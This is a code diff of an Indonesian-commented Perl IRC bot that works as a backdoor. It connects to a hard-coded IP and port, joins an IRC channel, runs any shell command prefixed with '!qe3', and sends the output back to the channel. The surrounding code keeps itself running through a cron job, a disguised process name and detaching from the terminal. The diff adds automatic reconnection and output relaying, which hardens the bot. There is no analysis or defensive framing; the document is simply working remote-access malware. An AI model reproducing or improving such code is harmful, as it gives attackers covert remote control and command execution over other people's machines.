@@ -44,8 +44,8 @@ sub generate_random_nick {
 
 # Fungsi untuk menghubungkan ke IRC
 sub connect_to_irc {
-    my $server = 'irc.ongisnade.co.id';
-    my $port = 7000;
+    my $server = '163.47.11.212';
+    my $port = 8686;
     my $nick = generate_random_nick();
 
     my $socket = IO::Socket::INET->new(
@@ -78,7 +78,8 @@ sub check_if_already_running {
             print "Script is already running with PID $pid\n";
             exit 0;
         } else {
-            print "PID file exists but process not running. Starting new process.\n";
+            print "PID file exists but process not running. Removing PID file and starting new process.\n";
+            unlink $pid_file or die "Could not remove PID file: $!";
         }
     }
 }
@@ -96,18 +97,27 @@ sub ensure_cron_job {
     }
 }
 
-# Fungsi untuk mengeksekusi perintah shell
+# Fungsi untuk mengeksekusi perintah shell di direktori /tmp
 sub execute_command {
     my ($command) = @_;
-    my $output = `$command 2>&1`;
+    my $output;
+
+    # Ganti direktori kerja ke /tmp
+    chdir('/tmp') or die "Could not change directory to /tmp: $!";
+
+    # Eksekusi perintah
+    $output = `$command 2>&1`;
+
     return $output;
 }
 
-# Fungsi untuk mengirim pesan ke channel IRC
+# Fungsi untuk mengirim pesan ke channel IRC dengan penundaan 1 detik
 sub send_to_channel {
     my ($socket, $message) = @_;
-    $message =~ s/\r?\n/ | /g;  # Ganti newline dengan separator
-    print $socket "PRIVMSG #surabayacity :$message\r\n";
+    foreach my $line (split /\n/, $message) {
+        print $socket "PRIVMSG #surabayacity :$line\r\n";
+        sleep(1);  # Penundaan 1 detik antara setiap pesan
+    }
 }
 
 # Forking dan detachment dari terminal
@@ -135,6 +145,14 @@ sub set_process_name {
     close($fh);
 }
 
+# Memastikan direktori /tmp/cmd ada
+sub ensure_cmd_directory {
+    my $cmd_dir = '/tmp/cmd';
+    unless (-d $cmd_dir) {
+        mkdir $cmd_dir or die "Could not create directory $cmd_dir: $!";
+    }
+}
+
 # Pastikan cron job ada
 ensure_cron_job();
 
@@ -150,6 +168,9 @@ set_process_name($process);
 # Membuat file PID
 create_pid_file();
 
+# Memastikan direktori /tmp/cmd ada
+ensure_cmd_directory();
+
 my $pid = fork();
 if (!defined $pid) {
     die "Cannot fork: $!";
@@ -160,31 +181,43 @@ if ($pid == 0) {
     set_process_name($process);
 
     # Ini adalah proses anak, jalankan proses utama Anda di sini
-    my $socket = connect_to_irc();
+    my $socket;
     my $connected = 0;
 
-    # Loop koneksi IRC
-    while (my $answer = <$socket>) {
-        # Tampilkan balasan server
-        print $answer;
+    while (1) {
+        eval {
+            $socket = connect_to_irc();
+            $connected = 0;
 
-        # Balas permintaan ping (untuk menjaga koneksi tetap hidup)
-        if ($answer =~ m/^PING (.*?)$/gi) {
-            print "Replying with PONG ".$1."\n";
-            print $socket "PONG ".$1."\r\n";
-        }
+            # Loop koneksi IRC
+            while (my $answer = <$socket>) {
+                # Tampilkan balasan server
+                print $answer;
 
-        # Periksa apakah sudah terhubung dan join channel
-        if (!$connected && $answer =~ /376|422/) {
-            print $socket "JOIN #surabayacity\r\n";
-            $connected = 1;
-        }
+                # Balas permintaan ping (untuk menjaga koneksi tetap hidup)
+                if ($answer =~ m/^PING (.*?)$/gi) {
+                    print "Replying with PONG ".$1."\n";
+                    print $socket "PONG ".$1."\r\n";
+                }
 
-        # Mulai eksekusi perintah jika ada !qe3
-        if ($answer =~ /!qe3\s+(.*)/) {
-            my $command = $1;
-            my $result = execute_command($command);
-            send_to_channel($socket, $result);
+                # Periksa apakah sudah terhubung dan join channel
+                if (!$connected && $answer =~ /376|422/) {
+                    print $socket "JOIN #surabayacity\r\n";
+                    $connected = 1;
+                }
+
+                # Mulai eksekusi perintah jika ada !qe3
+                if ($answer =~ /!qe3\s+(.*)/) {
+                    my $command = $1;
+                    my $result = execute_command($command);
+                    send_to_channel($socket, $result);
+                }
+            }
+        };
+
+        if ($@) {
+            warn "IRC connection lost: $@. Reconnecting...\n";
+            sleep(5);  # Tunggu 5 detik sebelum mencoba terhubung kembali
         }
     }
 } else {
@@ -198,31 +231,43 @@ if ($pid == 0) {
                 # Ubah nama proses anak
                 set_process_name($process);
 
-                my $socket = connect_to_irc();
+                my $socket;
                 my $connected = 0;
 
-                # Loop koneksi IRC
-                while (my $answer = <$socket>) {
-                    # Tampilkan balasan server
-                    print $answer;
+                while (1) {
+                    eval {
+                        $socket = connect_to_irc();
+                        $connected = 0;
 
-                    # Balas permintaan ping (untuk menjaga koneksi tetap hidup)
-                    if ($answer =~ m/^PING (.*?)$/gi) {
-                        print "Replying with PONG ".$1."\n";
-                        print $socket "PONG ".$1."\r\n";
-                    }
+                        # Loop koneksi IRC
+                        while (my $answer = <$socket>) {
+                            # Tampilkan balasan server
+                            print $answer;
 
-                    # Periksa apakah sudah terhubung dan join channel
-                    if (!$connected && $answer =~ /376|422/) {
-                        print $socket "JOIN #surabayacity\r\n";
-                        $connected = 1;
-                    }
+                            # Balas permintaan ping (untuk menjaga koneksi tetap hidup)
+                            if ($answer =~ m/^PING (.*?)$/gi) {
+                                print "Replying with PONG ".$1."\n";
+                                print $socket "PONG ".$1."\r\n";
+                            }
 
-                    # Mulai eksekusi perintah jika ada !qe3
-                    if ($answer =~ /!qe3\s+(.*)/) {
-                        my $command = $1;
-                        my $result = execute_command($command);
-                        send_to_channel($socket, $result);
+                            # Periksa apakah sudah terhubung dan join channel
+                            if (!$connected && $answer =~ /376|422/) {
+                                print $socket "JOIN #surabayacity\r\n";
+                                $connected = 1;
+                            }
+
+                            # Mulai eksekusi perintah jika ada !qe3
+                            if ($answer =~ /!qe3\s+(.*)/) {
+                                my $command = $1;
+                                my $result = execute_command($command);
+                                send_to_channel($socket, $result);
+                            }
+                        }
+                    };
+
+                    if ($@) {
+                        warn "IRC connection lost: $@. Reconnecting...\n";
+                        sleep(5);  # Tunggu 5 detik sebelum mencoba terhubung kembali
                     }
                 }
             }
